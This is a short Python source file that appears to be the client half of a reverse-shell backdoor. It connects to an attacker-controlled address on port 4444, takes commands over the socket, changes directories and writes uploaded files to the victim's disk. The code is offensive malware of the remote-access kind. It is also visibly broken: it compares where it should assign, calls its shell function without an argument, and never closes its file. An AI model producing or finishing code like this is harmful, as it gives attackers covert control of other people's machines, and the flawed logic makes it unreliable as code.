import os
import socket
import json
import subprocess
import pyautogui
from termcolor import colored

def data_recv():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def down_file(file):
    f = open(file, 'wb')
    soc.settimeout(5)
    chunk = soc.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = soc.recv(1024)
        except socket.timeout as e:
            break
    soc.settimeout(None)
    f.close

def shell(command):
    while True:
        command == data_recv()
        if command == 'exit':
            break
        elif command == 'clear':
            pass
        elif command [:3] == 'cd ':
            os.chdir(command[3:])
        elif command == 'upload':
            down_file(command[7:])


soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

soc.connect(('192.168.100.201', 4444))

shell()